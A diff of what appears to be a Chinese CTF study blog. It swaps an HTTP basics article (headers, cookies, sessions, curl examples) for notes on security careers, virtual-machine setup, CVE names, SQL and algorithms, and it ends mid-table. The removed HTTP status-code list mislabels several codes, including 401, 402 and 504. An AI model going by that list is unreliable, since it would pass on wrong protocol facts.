@@ -137,10 +137,92 @@
 <div class="sidebar-toc-wrapper toc-div-class">
   <nav id="TableOfContents">
   <ul>
+    <li><a href="#kali-linux虚拟机需要iso镜像文件因为需要个性化配置自动创建了一个vmdk空白磁盘文件然后通过iso配置">kali linux虚拟机需要iso镜像文件，因为需要个性化配置，自动创建了一个vmdk空白磁盘文件，然后通过iso配置</a></li>
+    <li><a href="#但是靶机不需要可视化图像因此不需要iso镜像文件只需要更换磁盘文件即可直接把别人修改好的vmdk文件拿来用">但是靶机不需要可视化图像因此不需要iso镜像文件，只需要更换磁盘文件即可，直接把别人修改好的vmdk文件拿来用</a></li>
+    <li><a href="#镜像就相当于克隆出了一个系统">镜像就相当于克隆出了一个系统</a></li>
+    <li><a href="#处理器cpu">处理器CPU</a></li>
+    <li><a href="#硬盘">硬盘</a></li>
+    <li><a href="#cddvdide">CD/DVD(IDE)</a></li>
+    <li><a href="#网络适配器">网络适配器</a></li>
+    <li><a href="#网卡">网卡</a></li>
+    <li><a href="#拖拽传文件">拖拽传文件</a></li>
+    <li><a href="#sql和数据库理解">SQL和数据库理解</a></li>
+    <li><a href="#算法">算法</a></li>
+    <li><a href="#第一部分基础数据结构你的工具箱">第一部分：基础数据结构——你的“工具箱”</a></li>
+    <li><a href="#第二部分核心算法策略你的兵法">第二部分：核心算法策略——你的“兵法”</a>
+      <ul>
+        <li><a href="#1-我需要在数据中查找什么">1. 我需要在数据中查找什么？</a></li>
+        <li><a href="#2-我需要把一堆东西安排得明明白白">2. 我需要把一堆东西安排得明明白白？</a></li>
+        <li><a href="#3-在资源有限的情况下如何达到最好或最省">3. 在资源有限的情况下，如何达到最好（或最省）？</a></li>
+        <li><a href="#4-数据挖掘与模式发现ai安全的交叉领域">4. 数据挖掘与模式发现（AI/安全的交叉领域）</a></li>
+      </ul>
+    </li>
+    <li><a href="#第三部分ctf网络安全领域的专项战略地图">第三部分：CTF/网络安全领域的“专项战略地图”</a></li>
+    <li><a href="#总结">总结：</a></li>
+    <li><a href="#处理phpstudy遇到的问题"><strong>处理phpstudy遇到的问题</strong></a>
+      <ul>
+        <li><a href="#第一步在公司电脑上开启-ftp-服务">第一步：在公司电脑上开启 FTP 服务</a></li>
+        <li><a href="#第二步你在家用-ftp-客户端连接">第二步：你在家用 FTP 客户端连接</a></li>
+      </ul>
+    </li>
+    <li><a href="#数据库">数据库</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#sql注入">SQL注入</a>
+      <ul>
+        <li><a href="#第一步信息收集">第一步：信息收集</a></li>
+      </ul>
+    </li>
+    <li><a href="#2注入">2：注入</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#vscode代码视角">VScode/代码视角</a></li>
+    <li><a href="#源代码--编译汇编--机器码--加载到内存--cpu执行--结果写回">源代码 → 编译/汇编 → 机器码 → 加载到内存 → CPU执行 → 结果写回</a></li>
+    <li><a href="#https协议http">https协议/http</a></li>
+    <li><a href="#漏洞扫描">漏洞扫描</a></li>
+    <li><a href="#linux指令">Linux指令</a></li>
+    <li><a href="#ip">IP</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
     <li>
       <ul>
-        <li><a href="#http">http</a></li>
-        <li><a href="#post请求基本结构和get差不多">post请求基本结构和get差不多</a></li>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+        <li><a href="#-msfconsole主控台">📡 msfconsole：主控台</a></li>
+        <li><a href="#-msfvenom载荷生成器">🧬 msfvenom：载荷生成器</a></li>
+        <li><a href="#-主动攻击与被动攻击的一般流程">⚔️ 主动攻击与被动攻击的一般流程</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li></li>
       </ul>
     </li>
   </ul>
@@ -237,121 +319,1341 @@
       >2026-04-22</time
     >
   </span></div>
-</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="http基础知识">
-<a class="header-anchor" href="#http%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86"></a>
-HTTP基础知识
-</h1><h3 id="http">
-<a class="header-anchor" href="#http"></a>
-http
-</h3><p><strong>当我们在浏览器 中输入网址并回车后，浏览器会向服务器发送一个 HTTP 请求。这个请求由多个部分组成，其中最重要的是请求行、头部和正文。</strong></p>
-<p><strong>一个完整的http例如：</strong></p>
-<p><strong>GET /www.zip HTTP/1.1</strong>
-<strong>Host: challenge-bbb990ed1cd78ab4.sandbox.ctfhub.com:10800</strong>
-<strong>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0</strong>
-<strong>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</strong>
-<strong>Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5</strong>
-<strong>Accept-Encoding: gzip, deflate, br</strong>
-<strong>Connection: keep-alive</strong>
-<strong>Upgrade-Insecure-Requests: 1</strong>
-<strong>If-Modified-Since: Mon, 17 Feb 2020 13:32:53 GMT</strong>
-<strong>If-None-Match: W/&ldquo;5e4a9605-260&rdquo;</strong>
-<strong>Priority: u=0, i</strong></p>
-<p><strong>1，请求行</strong></p>
-<p><strong>请求行包含三个部分，分别是请求方法、请求 URI 和 HTTP 版本号。</strong></p>
-<p><strong>1）请求方法指定了客户端想要执行的动作，例如 GET、POST、PUT、DELETE 等。</strong></p>
-<p><strong>2）请求 URI 指定了要访问的资源的位置，也就是我们想要的信息的存放地。</strong></p>
-<p><strong>3）HTTP 版本号表示请求所使用的 HTTP 协议版本，往往是HTTP1.1。</strong></p>
-<p><strong>2、头部</strong>
-<strong>包含了一系列的键值对，用于向服务器传递一些请求信息。例如，Accept 表示客户端可以接受的响应内容类型，User-Agent 表示客户端的浏览器信息，Referer 表示客户端从哪个页面跳转而来等等。</strong></p>
-<p><img src="https://i-blog.csdnimg.cn/direct/49649004c2ce488f9a3bcdd65224d727.png" alt="img"></p>
-<p>3、正文
-正文是可选的（get就没有请求正文），用于向服务器传递一些数据。例如，当客户端向服务器提交表单时，表单数据就可以放在请求的正文中。</p>
-<p>4、HTTP 请求报文分析
-上面我们已经讲了HTTP请求的格式和内容，下面我们实战，看一下HTTP请求在实际传输过程中的样子。</p>
-<p>HTTP请求报文组成部分（再简述一下上面的理论）：</p>
-<p>1）请求行（必须在 HTTP 请求报文的第一行）</p>
-<p>2）请求头（即头部，从第二行开始，到第一个空行结束。请求头和请求体之间存在一个空行，是键值对）</p>
-<p>3）请求体（即正文，通常以键值对 {key:value}方式传递数据）</p>
-<p>下面是HTTP请求进行传递时的样子，</p>
-<p><img src="https://i-blog.csdnimg.cn/direct/70c0241bf46b465e825da1266989c276.jpeg" alt="img"></p>
-<h3 id="post请求基本结构和get差不多">
-<a class="header-anchor" href="#post%e8%af%b7%e6%b1%82%e5%9f%ba%e6%9c%ac%e7%bb%93%e6%9e%84%e5%92%8cget%e5%b7%ae%e4%b8%8d%e5%a4%9a"></a>
-post请求基本结构和get差不多
-</h3><p><strong>http状态码:</strong></p>
-<p>100：继续</p>
-<p>101：切换协议</p>
-<p>200：ok</p>
-<p>201：已接受请求且创建了资源</p>
-<p>202：已接受请求，但没有处理</p>
-<p>203：服务器已接受请求，但返回的信息可能来自另一个来源</p>
-<p>204：已接受请求但没有返回任何内容</p>
-<p>301：永久重定向</p>
-<p>302：临时重定向</p>
-<p>401：错误请求，服务器不能理解</p>
-<p>402：没有经过授权，可以理解为没有登陆</p>
-<p>403：服务器拒绝请求</p>
-<p>404：没有找到请求的资源</p>
-<p>407：需要代理授权</p>
-<p>408：请求超时</p>
-<p>409：请求发生冲突</p>
-<p>410：资源已经删除</p>
-<p>414：URL过长，服务器无法处理</p>
-<p>500：服务器内部错误</p>
-<p>502：错误网关</p>
-<p>503：服务器目前无法使用</p>
-<p>504：HTTP版本不支持</p>
-<p>1、介绍
-1）Session：由于HTTP协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是 Session。</p>
-<p>Session 是一种在服务器保存状态信息的机制。服务器在接收到客户端的请求时，为该客户端创建一个 Session 对象，并将该对象的 ID 保存在一个 Cookie 中发送给客户端。客户端在下一次请求时将该 Cookie 发送回服务器，服务器根据 Cookie 中的 Session ID 来查找该客户端对应的 Session 对象，从而实现状态管理。</p>
-<p>典型的场景比如购物车，当你点击下单按钮时，由于HTTP协议无状态，所以并不知道是哪个用户操作的，所以服务端要为特定的用户创建了特定的 Session，用用于标识这个用户，并且跟踪用户，这样才知道购物车里面有几本书。</p>
-<p>这个 Session是保存在服务端的，有一个唯一标识。在服务端保存 Session的方法很多，内存、数据库、文件都有。集群的时候也要考虑 Session的转移，在大型的网站一般会有专门的 Session服务器集群，用来保存用户会话，这个时候 Session信息都是放在内存的，使用一些缓存服务比如 Memcached之类的来放 Session。</p>
-<p>2）Cookie：思考一下服务端如何识别特定的客户？这个时候 Cookie就登场了。</p>
-<p>Cookie 是一种在客户端保存状态信息的机制。服务器可以通过 Set-Cookie 头部向客户端发送一个 Cookie，客户端在下一次请求时将该 Cookie 发送回服务器。服务器可以根据 Cookie 的内容来识别客户端的身份，从而实现状态管理。</p>
-<p>每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是用 Cookie来实现 Session跟踪的，第一次创建 Session的时候，服务端会在HTTP协议中告诉客户端，需要在Cookie里面记录个SessionID，以后每次请求把这个会话ID发送到服务器，我就知道你是谁了。</p>
-<p>设想你某次登陆过一个网站，只需要登录一次就可以在一定时间内浏览这个网站的所有内容，这是如何做到的？也是 Cookie</p>
-<p>Cookie是指某些网站为了辨别用户身份而储存在客户端上的数据（通常经过加密）。也就是说，只要有了某个用户的 cookie，就能以他的身份登录。</p>
-<p>2、工作原理
-其中工作原理大致如下：</p>
-<p>客户端请求服务端</p>
-<p>——&gt; 服务端开启会话，并下发一个特殊的COOKIE（会话的唯一标识符），   服务端将会话数据存储在指定位置</p>
-<p>——&gt;客户端收到服务端响应内容，并且保存这个COOKIE</p>
-<p>——&gt;客户端在下一次请求服务端时带上这个COOKIE，服务端根据这个唯一标识符读取相关会话数据，恢复会话的状态</p>
-<p>3、基于COOKIE、SESSION能做什么？
-有了COOKIE，我们能存储SESSION在浏览器端的唯一标识，能存储其他各种不敏感的数据。</p>
-<p>有了SESSION，我们能对同一个用户的连续访问行为进行识别，用户可以 避免重复登录的烦恼，比如你在PC上登录天猫，就能很欢乐的连续买买买，而不用买一件登录一次。</p>
-<p>简单来说，有了COOKIE、SESSION，我们就能进行连续请求与响应（与服务器已经“互相认识”），不用每次请求之前都得重新登录。</p>
-<p>CTFHUB前置技能</p>
-<p>1、请求方式：</p>
-<p>题目显示现在的HTTP方法是get，让我们使用CTF**B方法就可以获得flag，要猜到其实就是CTFHUB方法;直接抓包改请求方法，点击go，返回200ok.</p>
-<p>curl的使用   url为当前所在环境地址</p>
-<p>curl -v -X CTFHUB url/index.php</p>
-<p>1、curl的应用</p>
-<p><strong>curl是一种命令行工具，作用是发出网络请求，然后得到和提取数据，显示在&quot;标准输出&quot;（stdout）上面。Curl不只是一个编程用的函数库，这个命令本身，就是一个无比有用的网站开发工具。</strong>
-<strong>它支持多种协议 ，下面举例讲解如何将它用于网站开发。</strong></p>
-<p>1）查看网页源码
-直接在curl命令后加上网址，就可以看到网页源码。我们以网址www.sina.com为例（选择该网址，主要因为它的网页代码较短）。</p>
-<p>2）显示头信息
-<code>-i</code>参数可以显示http response的头信息，连同网页代码一起。</p>
-<p>3）显示通信过程
-<code>-v</code>参数可以显示一次http通信的整个过程，包括端口连接和http request 头信息。</p>
-<p>4）发送表单信息
-发送表单信息有GET和POST两种方法。GET方法相对简单，只要把数据附在网址后面就行。</p>
-<p>curl example.com/form.cgi?data=xxx
-AI写代码
-POST方法必须把数据和网址分开，curl就要用到&ndash;data参数。</p>
-<p>curl -X POST &ndash;data &ldquo;data=xxx&rdquo; example.com/form.cgi
-AI写代码
-如果你的数据没有经过表单编码，还可以让curl为你编码，参数是<code>--data-urlencode</code>。</p>
-<p>5）HTTP动词
-curl默认的HTTP动词是GET，使用<code>-X</code>参数可以支持其他动词。</p>
-<p>6）cookie
-使用<code>--cookie</code>参数，可以让curl发送cookie。</p>
-<p>curl &ndash;cookie &ldquo;name=xxx&rdquo; <a href="https://www.example.com">www.example.com</a>
-AI写代码
-至于具体的cookie的值，可以从http response头信息的<code>Set-Cookie</code>字段中得到。
-<code>-c cookie-file</code>可以保存服务器返回的cookie到文件，<code>-b cookie-file</code>可以使用这个文件作为cookie信息，进行后续的请求。</p>
-<p>7）HTTP认证
-有些网域需要HTTP认证，这时curl需要用到<code>--user</code>参数。</p>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="大学ctf打了3年安全厂商安服沉淀3年目前小技术管理个人建议如果你是普通大学感觉有两个出路第一个考个还不错的学校的研究生出来技术一般就能进甲方比较稳定-第二个也就是我选择的专攻技术大一大二可以专心学习ctfweb学习各种漏洞原理简单绕过杂项可以学很多基础比如wireshark之类的密码学可以了解各种加密算法二进制逆向基础的题型也不难借此了解汇编数据结构栈溢出之类的基础总之ctf主要打牢基础大三大四建议ctf大厂实习护网红队src结合一些比较实战并且能丰富简历的项目这样出来找工作还是比较轻松的但是这几年大环境确实不好了但是个人感觉安全比开发来说更有趣并且对普通学历的人更友好-至于工作之后如果是乙方建议往代码开发红队企业src之类感兴趣且有深度的方向持续专研至少要有一个拿得出手跟客户出牛逼的技术如果在甲方那更稳定且少走弯路搞管理加一点技术">
+<a class="header-anchor" href="#%e5%a4%a7%e5%ad%a6ctf%e6%89%93%e4%ba%863%e5%b9%b4%e5%ae%89%e5%85%a8%e5%8e%82%e5%95%86%e5%ae%89%e6%9c%8d%e6%b2%89%e6%b7%803%e5%b9%b4%e7%9b%ae%e5%89%8d%e5%b0%8f%e6%8a%80%e6%9c%af%e7%ae%a1%e7%90%86%e4%b8%aa%e4%ba%ba%e5%bb%ba%e8%ae%ae%e5%a6%82%e6%9e%9c%e4%bd%a0%e6%98%af%e6%99%ae%e9%80%9a%e5%a4%a7%e5%ad%a6%e6%84%9f%e8%a7%89%e6%9c%89%e4%b8%a4%e4%b8%aa%e5%87%ba%e8%b7%af%e7%ac%ac%e4%b8%80%e4%b8%aa%e8%80%83%e4%b8%aa%e8%bf%98%e4%b8%8d%e9%94%99%e7%9a%84%e5%ad%a6%e6%a0%a1%e7%9a%84%e7%a0%94%e7%a9%b6%e7%94%9f%e5%87%ba%e6%9d%a5%e6%8a%80%e6%9c%af%e4%b8%80%e8%88%ac%e5%b0%b1%e8%83%bd%e8%bf%9b%e7%94%b2%e6%96%b9%e6%af%94%e8%be%83%e7%a8%b3%e5%ae%9a-%e7%ac%ac%e4%ba%8c%e4%b8%aa%e4%b9%9f%e5%b0%b1%e6%98%af%e6%88%91%e9%80%89%e6%8b%a9%e7%9a%84%e4%b8%93%e6%94%bb%e6%8a%80%e6%9c%af%e5%a4%a7%e4%b8%80%e5%a4%a7%e4%ba%8c%e5%8f%af%e4%bb%a5%e4%b8%93%e5%bf%83%e5%ad%a6%e4%b9%a0ctfweb%e5%ad%a6%e4%b9%a0%e5%90%84%e7%a7%8d%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e7%ae%80%e5%8d%95%e7%bb%95%e8%bf%87%e6%9d%82%e9%a1%b9%e5%8f%af%e4%bb%a5%e5%ad%a6%e5%be%88%e5%a4%9a%e5%9f%ba%e7%a1%80%e6%af%94%e5%a6%82wireshark%e4%b9%8b%e7%b1%bb%e7%9a%84%e5%af%86%e7%a0%81%e5%ad%a6%e5%8f%af%e4%bb%a5%e4%ba%86%e8%a7%a3%e5%90%84%e7%a7%8d%e5%8a%a0%e5%af%86%e7%ae%97%e6%b3%95%e4%ba%8c%e8%bf%9b%e5%88%b6%e9%80%86%e5%90%91%e5%9f%ba%e7%a1%80%e7%9a%84%e9%a2%98%e5%9e%8b%e4%b9%9f%e4%b8%8d%e9%9a%be%e5%80%9f%e6%ad%a4%e4%ba%86%e8%a7%a3%e6%b1%87%e7%bc%96%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84%e6%a0%88%e6%ba%a2%e5%87%ba%e4%b9%8b%e7%b1%bb%e7%9a%84%e5%9f%ba%e7%a1%80%e6%80%bb%e4%b9%8bctf%e4%b8%bb%e8%a6%81%e6%89%93%e7%89%a2%e5%9f%ba%e7%a1%80%e5%a4%a7%e4%b8%89%e5%a4%a7%e5%9b%9b%e5%bb%ba%e8%ae%aectf%e5%a4%a7%e5%8e%82%e5%ae%9e%e4%b9%a0%e6%8a%a4%e7%bd%91%e7%ba%a2%e9%98%9fsrc%e7%bb%93%e5%90%88%e4%b8%80%e4%ba%9b%e6%af%94%e8%be%83%e5%ae%9e%e6%88%98%e5%b9%b6%e4%b8%94%e8%83%bd%e4%b8%b0%e5%af%8c%e7%ae%80%e5%8e%86%e7%9a%84%e9%a1%b9%e7%9b%ae%e8%bf%99%e6%a0%b7%e5%87%ba%e6%9d%a5%e6%89%be%e5%b7%a5%e4%bd%9c%e8%bf%98%e6%98%af%e6%af%94%e8%be%83%e8%bd%bb%e6%9d%be%e7%9a%84%e4%bd%86%e6%98%af%e8%bf%99%e5%87%a0%e5%b9%b4%e5%a4%a7%e7%8e%af%e5%a2%83%e7%a1%ae%e5%ae%9e%e4%b8%8d%e5%a5%bd%e4%ba%86%e4%bd%86%e6%98%af%e4%b8%aa%e4%ba%ba%e6%84%9f%e8%a7%89%e5%ae%89%e5%85%a8%e6%af%94%e5%bc%80%e5%8f%91%e6%9d%a5%e8%af%b4%e6%9b%b4%e6%9c%89%e8%b6%a3%e5%b9%b6%e4%b8%94%e5%af%b9%e6%99%ae%e9%80%9a%e5%ad%a6%e5%8e%86%e7%9a%84%e4%ba%ba%e6%9b%b4%e5%8f%8b%e5%a5%bd-%e8%87%b3%e4%ba%8e%e5%b7%a5%e4%bd%9c%e4%b9%8b%e5%90%8e%e5%a6%82%e6%9e%9c%e6%98%af%e4%b9%99%e6%96%b9%e5%bb%ba%e8%ae%ae%e5%be%80%e4%bb%a3%e7%a0%81%e5%bc%80%e5%8f%91%e7%ba%a2%e9%98%9f%e4%bc%81%e4%b8%9asrc%e4%b9%8b%e7%b1%bb%e6%84%9f%e5%85%b4%e8%b6%a3%e4%b8%94%e6%9c%89%e6%b7%b1%e5%ba%a6%e7%9a%84%e6%96%b9%e5%90%91%e6%8c%81%e7%bb%ad%e4%b8%93%e7%a0%94%e8%87%b3%e5%b0%91%e8%a6%81%e6%9c%89%e4%b8%80%e4%b8%aa%e6%8b%bf%e5%be%97%e5%87%ba%e6%89%8b%e8%b7%9f%e5%ae%a2%e6%88%b7%e5%87%ba%e7%89%9b%e9%80%bc%e7%9a%84%e6%8a%80%e6%9c%af%e5%a6%82%e6%9e%9c%e5%9c%a8%e7%94%b2%e6%96%b9%e9%82%a3%e6%9b%b4%e7%a8%b3%e5%ae%9a%e4%b8%94%e5%b0%91%e8%b5%b0%e5%bc%af%e8%b7%af%e6%90%9e%e7%ae%a1%e7%90%86%e5%8a%a0%e4%b8%80%e7%82%b9%e6%8a%80%e6%9c%af"></a>
+大学ctf打了3年，安全厂商安服沉淀3年，目前小技术管理。个人建议，如果你是普通大学感觉有两个出路，第一个考个还不错的学校的研究生，出来技术一般就能进甲方比较稳定。 第二个也就是我选择的，专攻技术，大一大二可以专心学习ctf，web学习各种漏洞原理简单绕过，杂项可以学很多基础比如wireshark之类的，密码学可以了解各种加密算法，二进制逆向基础的题型也不难，借此了解汇编，数据结构，栈溢出之类的基础，总之ctf主要打牢基础。大三大四建议ctf+大厂实习+护网红队+src，结合一些比较实战并且能丰富简历的项目。这样出来找工作还是比较轻松的，但是这几年大环境确实不好了，但是个人感觉安全比开发来说更有趣并且对普通学历的人更友好。 至于工作之后如果是乙方建议往代码开发，红队，企业src之类感兴趣且有深度的方向持续专研，至少要有一个拿得出手跟客户出牛逼的技术。如果在甲方那更稳定且少走弯路，搞管理加一点技术。
+</h1><h1 id="虚拟机知识">
+<a class="header-anchor" href="#%e8%99%9a%e6%8b%9f%e6%9c%ba%e7%9f%a5%e8%af%86"></a>
+虚拟机知识
+</h1><h2 id="kali-linux虚拟机需要iso镜像文件因为需要个性化配置自动创建了一个vmdk空白磁盘文件然后通过iso配置">
+<a class="header-anchor" href="#kali-linux%e8%99%9a%e6%8b%9f%e6%9c%ba%e9%9c%80%e8%a6%81iso%e9%95%9c%e5%83%8f%e6%96%87%e4%bb%b6%e5%9b%a0%e4%b8%ba%e9%9c%80%e8%a6%81%e4%b8%aa%e6%80%a7%e5%8c%96%e9%85%8d%e7%bd%ae%e8%87%aa%e5%8a%a8%e5%88%9b%e5%bb%ba%e4%ba%86%e4%b8%80%e4%b8%aavmdk%e7%a9%ba%e7%99%bd%e7%a3%81%e7%9b%98%e6%96%87%e4%bb%b6%e7%84%b6%e5%90%8e%e9%80%9a%e8%bf%87iso%e9%85%8d%e7%bd%ae"></a>
+kali linux虚拟机需要iso镜像文件，因为需要个性化配置，自动创建了一个vmdk空白磁盘文件，然后通过iso配置
+</h2><h2 id="但是靶机不需要可视化图像因此不需要iso镜像文件只需要更换磁盘文件即可直接把别人修改好的vmdk文件拿来用">
+<a class="header-anchor" href="#%e4%bd%86%e6%98%af%e9%9d%b6%e6%9c%ba%e4%b8%8d%e9%9c%80%e8%a6%81%e5%8f%af%e8%a7%86%e5%8c%96%e5%9b%be%e5%83%8f%e5%9b%a0%e6%ad%a4%e4%b8%8d%e9%9c%80%e8%a6%81iso%e9%95%9c%e5%83%8f%e6%96%87%e4%bb%b6%e5%8f%aa%e9%9c%80%e8%a6%81%e6%9b%b4%e6%8d%a2%e7%a3%81%e7%9b%98%e6%96%87%e4%bb%b6%e5%8d%b3%e5%8f%af%e7%9b%b4%e6%8e%a5%e6%8a%8a%e5%88%ab%e4%ba%ba%e4%bf%ae%e6%94%b9%e5%a5%bd%e7%9a%84vmdk%e6%96%87%e4%bb%b6%e6%8b%bf%e6%9d%a5%e7%94%a8"></a>
+但是靶机不需要可视化图像因此不需要iso镜像文件，只需要更换磁盘文件即可，直接把别人修改好的vmdk文件拿来用
+</h2><h2 id="镜像就相当于克隆出了一个系统">
+<a class="header-anchor" href="#%e9%95%9c%e5%83%8f%e5%b0%b1%e7%9b%b8%e5%bd%93%e4%ba%8e%e5%85%8b%e9%9a%86%e5%87%ba%e4%ba%86%e4%b8%80%e4%b8%aa%e7%b3%bb%e7%bb%9f"></a>
+镜像就相当于克隆出了一个系统
+</h2><h2 id="处理器cpu">
+<a class="header-anchor" href="#%e5%a4%84%e7%90%86%e5%99%a8cpu"></a>
+处理器CPU
+</h2><p><strong>处理器相当于公司大楼数量，内核相当于大楼里的员工，内核总数就是总员工数</strong></p>
+<p><strong>内核是真正的干活计算单元，一个核心最多只能感一件事，多个核心就能干多件事，来提升效率</strong></p>
+<h2 id="硬盘">
+<a class="header-anchor" href="#%e7%a1%ac%e7%9b%98"></a>
+硬盘
+</h2><p><strong>硬盘装有系统，文件，软件(可以发挥功能的文件</strong></p>
+<p><strong>整理文件碎片是把文件放连续便于读取</strong></p>
+<p><strong>接口从慢到快有IDE,SATA,M.2，接口就是用来把磁盘上的文件呈现给人类，相当于连接口，翻译官</strong></p>
+<p>等同电源接口，USB接口(和端口意思很像)</p>
+<ul>
+<li><strong>物理硬件</strong> = <strong>硬盘</strong>（负责永久存储）</li>
+<li><strong>操作系统显示</strong> = <strong>C盘/D盘</strong>（硬盘上的分区）</li>
+<li><strong>数据中转站</strong> = <strong>内存</strong>（负责临时存放正在运行的数据）</li>
+<li>数据要拿到内存中去处理</li>
+</ul>
+<h2 id="cddvdide">
+<a class="header-anchor" href="#cddvdide"></a>
+CD/DVD(IDE)
+</h2><p><strong>DVD是光盘，CD/DVD(IDE)等于虚拟机的光驱</strong></p>
+<p><strong>除此之外还有CD光盘，游戏机光盘</strong></p>
+<p><strong>光盘只是可读，而硬盘可读可写</strong></p>
+<p><strong>在装虚拟机时需要从物理光盘或者iso镜像文件(等价于光盘)</strong></p>
+<p><strong>可以说硬盘是家，光盘是快递，光驱是快递员，虚拟机接受了光盘里的信息后，光盘实际上就没用了</strong></p>
+<p><strong>旧版仿真针对的是老系统，把先进的光驱伪装一下让老系统认识</strong></p>
+<h2 id="网络适配器">
+<a class="header-anchor" href="#%e7%bd%91%e7%bb%9c%e9%80%82%e9%85%8d%e5%99%a8"></a>
+网络适配器
+</h2><p><strong>桥接模式，在主机旁边独立租房，有自己的ip，和主机是邻居，能被局域网其他设备看到</strong></p>
+<p><strong>NAT模式，和主机住在了一起里面，别人看不到</strong></p>
+<p><strong>仅主机模式，只和主机关进小黑屋，能和主机交流也能和住进黑屋里的别的虚拟机交流，但是不能上网</strong></p>
+<p><strong>LAN区段，建立一个微信群，只有群里的虚拟机才能看到</strong></p>
+<h2 id="网卡">
+<a class="header-anchor" href="#%e7%bd%91%e5%8d%a1"></a>
+网卡
+</h2><p><strong>网卡是房子的门，WIFI是看不见的无线门，mac是身份证号，ip是门牌号，端口是房子里各个物品的连接口</strong></p>
+<p><strong>监视器就是显示器，声卡是用于发出声音的硬件</strong></p>
+<p><strong>虚拟机引擎用于加速</strong></p>
+<h2 id="拖拽传文件">
+<a class="header-anchor" href="#%e6%8b%96%e6%8b%bd%e4%bc%a0%e6%96%87%e4%bb%b6"></a>
+拖拽传文件
+</h2><p>纠缠了我好久的文件从物理机到虚拟机我终于解决了，直接ctrl+c和ctrl+v就进去了，或者使用winSCP利用ssh服务连接上，拖拽功能随VM版本变化而稳定性不同，拖拽关闭可以增强安全性，拖拽可能会成为攻击的通道·！！！完美解决哈哈哈</p>
+<p>拖拽漏洞实例：CVE-2016-7461利用拖拽功能内存越界访问，恶意程序释放出来</p>
+<p>CVE-2017-4901:漏洞的利用代码公开，恶意代码逃逸</p>
+<p>CVE-2025-22247:普通用户触发不安全文件操作</p>
+<h2 id="sql和数据库理解">
+<a class="header-anchor" href="#sql%e5%92%8c%e6%95%b0%e6%8d%ae%e5%ba%93%e7%90%86%e8%a7%a3"></a>
+SQL和数据库理解
+</h2><p><strong>SQL只是查询语言，那意思是说比如说比如啊，就比如说很简单，一个购物平台，我在那个搜索框里面搜索东西，实际上它后台用到的是SQL语句，然后他拿的东西就是它后面的被存入到数据库里边的东西，而它想要被存入到数据库，那么它这个数据库就会用自动用这个数据库语言去呃，去就是写到它的数据库里边，进而就是有这些有了这些商品</strong></p>
+<h2 id="算法">
+<a class="header-anchor" href="#%e7%ae%97%e6%b3%95"></a>
+算法
+</h2><ul>
+<li><strong>正在贬值的部分（“术”）：</strong> 手写代码的能力、默写标准解法的熟练度、应对无AI竞赛的刷题技巧。这部分正在被AI快速替代。</li>
+<li><strong>正在升值的部分（“道”）：</strong> 面对复杂问题时的<strong>拆解能力</strong>、对算法模型的<strong>场景匹配能力</strong>、对复杂度的<strong>权衡决策能力</strong>。这部分是AI难以替代的“人类壁垒”。</li>
+</ul>
+<h2 id="第一部分基础数据结构你的工具箱">
+<a class="header-anchor" href="#%e7%ac%ac%e4%b8%80%e9%83%a8%e5%88%86%e5%9f%ba%e7%a1%80%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84%e4%bd%a0%e7%9a%84%e5%b7%a5%e5%85%b7%e7%ae%b1"></a>
+第一部分：基础数据结构——你的“工具箱”
+</h2><p>在任何复杂的策略之前，首先要识别出数据长什么样。这就像你要修理东西，先得知道手里拿的是扳手还是螺丝刀。</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">数据结构</th>
+          <th style="text-align: left">它长什么样？</th>
+          <th style="text-align: left">核心解决什么问题？</th>
+          <th style="text-align: left">看到什么场景用它？</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>数组 / 链表</strong></td>
+          <td style="text-align: left">一串排着队的元素。</td>
+          <td style="text-align: left">存储和遍历一组数据。</td>
+          <td style="text-align: left">几乎是一切程序的基础。需要快速访问用数组，需要频繁插入删除用链表。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>栈</strong></td>
+          <td style="text-align: left">一个桶。后进先出。</td>
+          <td style="text-align: left">处理具有“回溯”性质的问题。</td>
+          <td style="text-align: left"><strong>CTF/安全场景</strong>：函数调用栈跟踪、括号匹配检测、表达式求值、浏览器的后退功能。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>队列</strong></td>
+          <td style="text-align: left">一根管道。先进先出。</td>
+          <td style="text-align: left">处理具有“排队”性质的问题。</td>
+          <td style="text-align: left"><strong>CTF/安全场景</strong>：广度优先搜索（BFS）的基础、任务调度、处理并发请求的缓冲池。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>哈希表</strong></td>
+          <td style="text-align: left">一个超级查找表。</td>
+          <td style="text-align: left">在几乎不花时间的情况下，快速查找、删除、插入数据。</td>
+          <td style="text-align: left"><strong>通用/安全</strong>：建索引、缓存数据、检查重复元素。在Web安全中，用来快速匹配恶意负载特征库。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>树</strong></td>
+          <td style="text-align: left">一个分层的目录。有根有叶。</td>
+          <td style="text-align: left">表示具有层级关系的数据。</td>
+          <td style="text-align: left"><strong>通用</strong>：文件系统、域名解析（DNS）。<strong>算法核心</strong>：二叉搜索树（快速查找）、堆（找最大值/最小值）。</td>
+      </tr>
